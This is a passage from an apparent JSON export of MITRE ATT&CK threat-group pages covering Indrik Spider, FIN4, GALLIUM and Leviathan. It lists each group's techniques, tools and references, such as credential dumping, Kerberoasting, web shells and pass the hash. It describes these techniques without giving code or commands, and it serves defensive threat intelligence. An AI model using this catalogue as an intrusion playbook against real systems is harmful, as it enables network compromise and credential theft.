dumping using ProcDump.[6] Enterprise T1012 Query Registry Indrik Spider has used a service account to extract copies of the Security Registry hive.[5] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Indrik Spider has used RDP for lateral movement.[5] .004 Remote Services: SSH Indrik Spider has used SSH for lateral movement.[5] Enterprise T1018 Remote System Discovery Indrik Spider has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database.[6] Enterprise T1489 Service Stop Indrik Spider has used PsExec to stop services prior to the execution of ransomware.[6] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting Indrik Spider has conducted Kerberoasting attacks using a module from GitHub.[5] Enterprise T1007 System Service Discovery Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system.[6] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files Indrik Spider has searched files to obtain and exfiltrate credentials.[5] Enterprise T1204 .002 User Execution: Malicious File Indrik Spider has attempted to get users to click on a malicious zipped file.[6] Enterprise T1078 Valid Accounts Indrik Spider has used valid accounts for initial access and lateral movement.[5] Indrik Spider has also maintained access to the victim environment through the VPN infrastructure.[5] .002 Domain Accounts Indrik Spider has collected credentials from infected systems, including domain accounts.[1] Enterprise T1047 Windows Management Instrumentation Indrik Spider has used WMIC to execute commands on remote computers.[6] Software ID Name References Techniques S0570 BitPaymer [1][2] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Token Impersonation/Theft, Account Discovery: Local Account, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Create or Modify System Process: Windows Service, Data Encrypted for Impact, Execution Guardrails, File and Directory Permissions Modification: Windows File and Directory Permissions Modification, Hide Artifacts: NTFS File Attributes, Indicator Removal: Timestomp, Inhibit System Recovery, Modify Registry, Native API, Network Share Discovery, Obfuscated Files or Information: Encrypted/Encoded File, Query Registry, Remote System Discovery, System Service Discovery S0154 Cobalt Strike [2][7][5] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0695 Donut [8] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Python, Command and Scripting Interpreter, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: PowerShell, Impair Defenses: Disable or Modify Tools, Indicator Removal, Ingress Tool Transfer, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Compression, Process Discovery, Process Injection, Reflective Code Loading S0384 Dridex [1][2][3] Application Layer Protocol: Web Protocols, Browser Session Hijacking, Encrypted Channel: Symmetric Cryptography, Encrypted Channel: Asymmetric Cryptography, Hijack Execution Flow: DLL, Native API, Obfuscated Files or Information, Proxy, Proxy: Multi-hop Proxy, Remote Access Tools, Scheduled Task/Job: Scheduled Task, Software Discovery, System Binary Proxy Execution: Regsvr32, System Information Discovery, User Execution: Malicious File S0363 Empire [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0002 Mimikatz [1][5] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0029 PsExec [6] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0612 WastedLocker [8][2][7][9] Abuse Elevation Control Mechanism: Bypass User Account Control, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encrypted for Impact, Deobfuscate/Decode Files or Information, File and Directory Discovery, File and Directory Permissions Modification: Windows File and Directory Permissions Modification, Hide Artifacts: Hidden Files and Directories, Hide Artifacts: NTFS File Attributes, Hijack Execution Flow: DLL, Inhibit System Recovery, Modify Registry, Native API, Network Share Discovery, Obfuscated Files or Information: Junk Code Insertion, Obfuscated Files or Information: Encrypted/Encoded File, Peripheral Device Discovery, Query Registry, System Services: Service Execution, Virtualization/Sandbox Evasion: System Checks References Frankoff, S., Hartley, B. (2018, November 14). Big Game Hunting: The Evolution of INDRIK SPIDER From Dridex Wire Fraud to BitPaymer Targeted Ransomware. Retrieved January 6, 2021. Podlosky, A., Feeley, B. (2021, March 17). INDRIK SPIDER Supersedes WastedLocker with Hades Ransomware to Circumvent OFAC Sanctions. Retrieved September 15, 2021. U.S. Department of Treasury. (2019, December 5). Treasury Sanctions Evil Corp, the Russia-Based Cybercriminal Group Behind Dridex Malware. Retrieved September 15, 2021. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Mandiant Intelligence. (2022, June 2). To HADES and Back: UNC2165 Shifts to LOCKBIT to Evade Sanctions. Retrieved July 29, 2024. Symantec Threat Intelligence. (2020, June 25). WastedLocker: Symantec Identifies Wave of Attacks Against U.S. Organizations. Retrieved May 20, 2021. Microsoft. (2022, May 9). Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself. Retrieved March 10, 2023. Antenucci, S., Pantazopoulos, N., Sandee, M. (2020, June 23). WastedLocker: A New Ransomware Variant Developed By The Evil Corp Group. Retrieved September 14, 2021. Milenkoski, A. (2022, November 7). SocGholish Diversifies and Expands Its Malware Staging Infrastructure to Counter Defenders. Retrieved March 22, 2024. "
},
{
"id": 93,
"title": "FIN4, Group G0085",
"path": "/groups/G0085/index.html",
"content": " FIN4 FIN4 is a financially-motivated threat group that has targeted confidential information related to the public financial market, particularly regarding healthcare and pharmaceutical companies, since at least 2013.[1][2] FIN4 is unique in that they do not infect victims with typical persistent malware, but rather they focus on capturing credentials authorized to access email and other non-public correspondence.[1][3] ID: G0085 Version: 1.2 Created: 31 January 2019 Last Modified: 17 November 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols FIN4 has used HTTP POST requests to transmit data.[1][3] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic FIN4 has used VBA macros to display a dialog box and collect victim credentials.[1][3] Enterprise T1114 .002 Email Collection: Remote Email Collection FIN4 has accessed and hijacked online email communications using stolen credentials.[1][3] Enterprise T1564 .008 Hide Artifacts: Email Hiding Rules FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as \"hacked,\" \"phish,\" and \"malware\" in a likely attempt to prevent organizations from communicating about their activities.[1] Enterprise T1056 .001 Input Capture: Keylogging FIN4 has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger.[1][3] .002 Input Capture: GUI Input Capture FIN4 has presented victims with spoofed Windows Authentication prompts to collect their credentials.[1][3] Enterprise T1566 .001 Phishing: Spearphishing Attachment FIN4 has used spearphishing emails containing attachments (which are often stolen, legitimate documents sent from compromised accounts) with embedded malicious macros.[1][3] .002 Phishing: Spearphishing Link FIN4 has used spearphishing emails (often sent from compromised accounts) containing malicious links.[1][3] Enterprise T1090 .003 Proxy: Multi-hop Proxy FIN4 has used Tor to log in to victims' email accounts.[1] Enterprise T1204 .001 User Execution: Malicious Link FIN4 has lured victims to click malicious links delivered via spearphishing emails (often sent from compromised accounts).[1][3] .002 User Execution: Malicious File FIN4 has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts).[1][3] Enterprise T1078 Valid Accounts FIN4 has used legitimate credentials to hijack email communications.[1][3] References Vengerik, B. et al.. (2014, December 5). Hacking the Street? FIN4 Likely Playing the Market. Retrieved December 17, 2018. Dennesen, K. et al.. (2014, November 30). FIN4: Stealing Insider Information for an Advantage in Stock Trading?. Retrieved November 17, 2024. Vengerik, B. & Dennesen, K.. (2014, December 5). Hacking the Street? FIN4 Likely Playing the Market. Retrieved January 15, 2019. "
},
{
"id": 94,
"title": "GALLIUM, Granite Typhoon, Group G0093",
"path": "/groups/G0093/index.html",
"content": " GALLIUM GALLIUM is a cyberespionage group that has been active since at least 2012, primarily targeting telecommunications companies, financial institutions, and government entities in Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia, and Vietnam. This group is particularly known for launching Operation Soft Cell, a long-term campaign targeting telecommunications providers.[1] Security researchers have identified GALLIUM as a likely Chinese state-sponsored group, based in part on tools used and TTPs commonly associated with Chinese threat actors.[1][2][3] ID: G0093 \u24d8 Associated Groups: Granite Typhoon Contributors: Daniyal Naeem, BT Security; Cybereason Nocturnus, @nocturnus Version: 4.0 Created: 18 July 2019 Last Modified: 17 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description Granite Typhoon [4] Techniques Used Domain ID Name Use Enterprise T1583 .004 Acquire Infrastructure: Server GALLIUM has used Taiwan-based servers that appear to be exclusive to GALLIUM.[2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility GALLIUM used WinRAR to compress and encrypt stolen data prior to exfiltration.[1][2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell GALLIUM used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.[1] .003 Command and Scripting Interpreter: Windows Command Shell GALLIUM used the Windows command shell to execute commands.[1] Enterprise T1136 .002 Create Account: Domain Account GALLIUM created high-privileged domain user accounts to maintain access to victim networks.[1][2] Enterprise T1005 Data from Local System GALLIUM collected data from the victim's local system, including password hashes from the SAM hive in the Registry.[1] Enterprise T1074 .001 Data Staged: Local Data Staging GALLIUM compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.[1] Enterprise T1041 Exfiltration Over C2 Channel GALLIUM used Web shells and HTRAN for C2 and to exfiltrate data.[1] Enterprise T1190 Exploit Public-Facing Application GALLIUM exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.[1][2] Enterprise T1133 External Remote Services GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.[1][2] Enterprise T1574 .001 Hijack Execution Flow: DLL GALLIUM used DLL side-loading to covertly load PoisonIvy into memory on the victim machine.[1] Enterprise T1105 Ingress Tool Transfer GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN.[1][2] Enterprise T1570 Lateral Tool Transfer GALLIUM has used PsExec to move laterally between hosts in the target network.[2] Enterprise T1036 .003 Masquerading: Rename Legitimate Utilities GALLIUM used a renamed cmd.exe file to evade detection.[1] Enterprise T1027 Obfuscated Files or Information GALLIUM used a modified version of HTRAN in which they obfuscated strings such as debug messages in an apparent attempt to evade detection.[1] .002 Software Packing GALLIUM packed some payloads using different types of packers, both known and custom.[1] .005 Indicator Removal from Tools GALLIUM ensured each payload had a unique hash, including by using different types of packers.[1] Enterprise T1588 .002 Obtain Capabilities: Tool GALLIUM has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions.[2] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory GALLIUM used a modified version of Mimikatz along with a PowerShell-based Mimikatz to dump credentials on the victim machines.[1][2] .002 OS Credential Dumping: Security Account Manager GALLIUM used reg commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes.[1] Enterprise T1090 .002 Proxy: External Proxy GALLIUM used a modified version of HTRAN to redirect connections between networks.[1] Enterprise T1018 Remote System Discovery GALLIUM used a modified version of NBTscan to identify available NetBIOS name servers over the network as well as ping to identify remote systems.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task GALLIUM established persistence for PoisonIvy by created a scheduled task.[1] Enterprise T1505 .003 Server Software Component: Web Shell GALLIUM used Web shells to persist in victim environments and assist in execution and exfiltration.[1][2] Enterprise T1553 .002 Subvert Trust Controls: Code Signing GALLIUM has used stolen certificates to sign its tools including those from Whizzimo LLC.[2] Enterprise T1016 System Network Configuration Discovery GALLIUM used ipconfig /all to obtain information about the victim network configuration. The group also ran a modified version of NBTscan to identify available NetBIOS name servers.[1] Enterprise T1049 System Network Connections Discovery GALLIUM used netstat -oan to obtain information about the victim network connections.[1] Enterprise T1033 System Owner/User Discovery GALLIUM used whoami and query user to obtain information about the victim user.[1] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash GALLIUM used dumped hashes to authenticate to other machines via pass the hash.[1] Enterprise T1078 Valid Accounts GALLIUM leveraged valid accounts to maintain access to a victim network.[1] Enterprise T1047 Windows Management Instrumentation GALLIUM used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.[1] Software ID Name References Techniques S0110 at [1] Scheduled Task/Job: At S0564 BlackMould [2] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Ingress Tool Transfer, System Information Discovery S0020 China Chopper [1][2] Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information: Software Packing, Server Software Component: Web Shell S0106 cmd [1][2] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Lateral Tool Transfer, System Information Discovery S0040 HTRAN [1][2] Process Injection, Proxy, Rootkit S0100 ipconfig [1] System Network Configuration Discovery S0002 Mimikatz [1][2] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0590 NBTscan [1] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery S0039 Net [1] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0097 Ping [1] Remote System Discovery S1031 PingPull [3] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Timestomp, Masquerading: Masquerade Task or Service, Non-Application Layer Protocol, Non-Standard Port, System Information Discovery, System Network Configuration Discovery S0013 PlugX [1] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0012 PoisonIvy [1][2] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0029 PsExec [1][2] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0075 Reg [1] Modify Registry, Query Registry, Unsecured Credentials: Credentials in Registry S0005 Windows Credential Editor [2] OS Credential Dumping: LSASS Memory References Cybereason Nocturnus. (2019, June 25). Operation Soft Cell: A Worldwide Campaign Against Telecommunications Providers. Retrieved July 18, 2019. MSTIC. (2019, December 12). GALLIUM: Targeting global telecom. Retrieved January 13, 2021. Unit 42. (2022, June 13). GALLIUM Expands Targeting Across Telecommunications, Government and Finance Sectors With New PingPull Tool. Retrieved August 7, 2022. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. "
},
{
"id": 95,
"title": "Leviathan, MUDCARP, Kryptonite Panda, Gadolinium, BRONZE MOHAWK, TEMP.Jumper, APT40, TEMP.Periscope, Gingham Typhoon, Group G0065",
"path": "/groups/G0065/index.html",
"content": " Leviathan Leviathan is a Chinese state-sponsored cyber espionage group that has been attributed to the Ministry of State Security's (MSS) Hainan State Security Department and an affiliated front company.[1] Active since at least 2009, Leviathan has targeted the following sectors: academia, aerospace/aviation, biomedical, defense industrial base, government, healthcare, manufacturing, maritime, and transportation across the US, Canada, Australia, Europe, the Middle East, and Southeast Asia.[1][2][3][4] ID: G0065 \u24d8 Associated Groups: MUDCARP, Kryptonite Panda, Gadolinium, BRONZE MOHAWK, TEMP.Jumper, APT40, TEMP.Periscope, Gingham Typhoon Contributors: Valerii Marchuk, Cybersecurity Help s.r.o. Version: 4.1 Created: 18 April 2018 Last Modified: 03 February 2025 Version Permalink Live Version Associated Group Descriptions Name Description MUDCARP [1][5] Kryptonite Panda [1][6] Gadolinium [1][7] BRONZE MOHAWK [1][8] TEMP.Jumper Leviathan was previously reported upon by FireEye as TEMP.Periscope and TEMP.Jumper.[1][9] APT40 FireEye reporting on TEMP.Periscope (which was combined into APT40) indicated TEMP.Periscope was reported upon as Leviathan.[1][2][3][9] TEMP.Periscope Leviathan was previously reported upon by FireEye as TEMP.Periscope and TEMP.Jumper.[1][3][9] Gingham Typhoon [10] Campaigns ID Name First Seen Last Seen References Techniques C0049 Leviathan Australian Intrusions April 2022 [4] September 2022 [4] Leviathan Australian Intrusions was conducted by the Leviathan threat actor.[4] Data from Information Repositories, Data Staged: Local Data Staging, Domain Trust Discovery, Exfiltration Over C2 Channel, Exploit Public-Facing Application, Exploitation for Credential Access, Exploitation for Privilege Escalation, Group Policy Discovery, Impair Defenses: Disable or Modify System Firewall, Input Capture, Multi-Factor Authentication Interception, Network Share Discovery, Obtain Capabilities: Vulnerabilities, Remote Services: SMB/Windows Admin Shares, Remote Services: SSH, Remote System Discovery, Search Victim-Owned Websites, Server Software Component: Web Shell, Steal Application Access Token, Steal or Forge Kerberos Tickets: Kerberoasting, System Information Discovery, Unsecured Credentials, Unsecured Credentials: Credentials In Files, Valid Accounts: Domain Accounts, Valid Accounts, Valid Accounts: Local Accounts Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Leviathan has established domains that impersonate legitimate entities to use for targeting efforts. [1][5] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning Leviathan has conducted reconnaissance against target networks of interest looking for vulnerable, end-of-life, or no longer maintainted devices against which to rapidly deploy exploits.[4] Enterprise T1560 Archive Collected Data Leviathan has archived victim's data prior to exfiltration.[1] Enterprise T1197 BITS Jobs Leviathan has used BITSAdmin to download additional tools.[3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.[2][3] .009 Boot or Logon Autostart Execution: Shortcut Modification Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.[2][3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Leviathan has used PowerShell for execution.[2][3][1][5] .005 Command and Scripting Interpreter: Visual Basic Leviathan has used VBScript.[2] Enterprise T1586 .001 Compromise Accounts: Social Media Accounts Leviathan has compromised social media accounts to conduct social engineering attacks.[1] .002 Compromise Accounts: Email Accounts Leviathan has compromised email accounts to conduct social engineering attacks.[1] Enterprise T1584 .004 Compromise Infrastructure: Server Leviathan has used compromised legitimate websites as command and control nodes for operations.[4] .008 Compromise Infrastructure: Network Devices Leviathan has used compromised networking devices, such as small office/home office (SOHO) devices, as operational command and control infrastructure.[4] Enterprise T1213 Data from Information Repositories Leviathan gathered information from SQL servers and Building Management System (BMS) servers during Leviathan Australian Intrusions.[4] Enterprise T1074 .001 Data Staged: Local Data Staging Leviathan has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.[3][1] Leviathan stored captured credential material on local log files on victim systems during Leviathan Australian Intrusions.[4] .002 Data Staged: Remote Data Staging Leviathan has staged data remotely prior to exfiltration.[1] Enterprise T1140 Deobfuscate/Decode Files or Information Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.[2] Enterprise T1587 .004 Develop Capabilities: Exploits Leviathan has rapidly transformed and adapted public exploit proof-of-concept code for new vulnerabilities and utilized them against target networks.[4] Enterprise T1482 Domain Trust Discovery Leviathan performed Active Directory enumeration of victim environments during Leviathan Australian Intrusions.[4] Enterprise T1189 Drive-by Compromise Leviathan has infected victims using watering holes.[1] Enterprise T1585 .001 Establish Accounts: Social Media Accounts Leviathan has created new social media accounts for targeting efforts.[1] .002 Establish Accounts: Email Accounts Leviathan has created new email accounts for targeting efforts.[1] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription Leviathan has used WMI for persistence.[3] Enterprise T1041 Exfiltration Over C2 Channel Leviathan has exfiltrated data over its C2 channel.[1] Leviathan exfiltrated collected data over existing command and control channels during Leviathan Australian Intrusions.[4] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.[2][3] Enterprise T1190 Exploit Public-Facing Application Leviathan has used exploits against publicly-disclosed vulnerabilities for initial access into victim networks.[4] Leviathan exploited public-facing web applications and appliances for initial access during Leviathan Australian Intrusions.[4] Enterprise T1203 Exploitation for Client Execution Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.[2][3][1][5] Enterprise T1212 Exploitation for Credential Access Leviathan exploited vulnerable network appliances during Leviathan Australian Intrusions, leading to the collection and exfiltration of valid credentials.[4] Enterprise T1068 Exploitation for Privilege Escalation Leviathan exploited software vulnerabilities in victim environments to escalate privileges during Leviathan Australian Intrusions.[4] Enterprise T1133 External Remote Services Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access.[1] Enterprise T1589 .001 Gather Victim Identity Information: Credentials Leviathan has collected compromised credentials to use for targeting efforts.[1] Enterprise T1615 Group Policy Discovery Leviathan performed extensive Active Directory enumeration of victim environments during Leviathan Australian Intrusions.[4] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall Leviathan modified system firewalls to add two open listening ports on 9998 and 9999 during Leviathan Australian Intrusions.[4] Enterprise T1105 Ingress Tool Transfer Leviathan has downloaded additional scripts and files from adversary-controlled servers.[2][3] Enterprise T1056 Input Capture Leviathan captured submitted multfactor authentication codes and other technical artifacts related to remote access sessions during Leviathan Australian Intrusions.[4] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange Leviathan has utilized OLE as a method to insert malicious content inside various phishing documents. [5] Enterprise T1534 Internal Spearphishing Leviathan has conducted internal spearphishing within the victim's environment for lateral movement.[1] Enterprise T1111 Multi-Factor Authentication Interception Leviathan abused compromised appliance access to collect multifactor authentication token values during Leviathan Australian Intrusions.[4] Enterprise T1135 Network Share Discovery Leviathan scanned and enumerated remote network shares in victim environments during Leviathan Australian Intrusions.[4] Enterprise T1027 .001 Obfuscated Files or Information: Binary Padding Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection.[2] .003 Obfuscated Files or Information: Steganography Leviathan has used steganography to hide stolen data inside other files stored on Github.[1] .013 Obfuscated Files or Information: Encrypted/Encoded File Leviathan has obfuscated code using base64.[2] .015 Obfuscated Files or Information: Compression Leviathan has obfuscated code using gzip compression.[2] Enterprise T1588 .006 Obtain Capabilities: Vulnerabilities Leviathan weaponized publicly-known vulnerabilities for initial access and other purposes during Leviathan Australian Intrusions.[4] Enterprise T1003 OS Credential Dumping Leviathan has used publicly available tools to dump password hashes, including HOMEFRY.[9] .001 LSASS Memory Leviathan has used publicly available tools to dump password hashes, including ProcDump and WCE.[9] Enterprise T1566 .001 Phishing: Spearphishing Attachment Leviathan has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.[2][1] .002 Phishing: Spearphishing Link Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.[2][1] Enterprise T1055 .001 Process Injection: Dynamic-link Library Injection Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.[5] Enterprise T1572 Protocol Tunneling Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure.[1] Enterprise T1090 .003 Proxy: Multi-hop 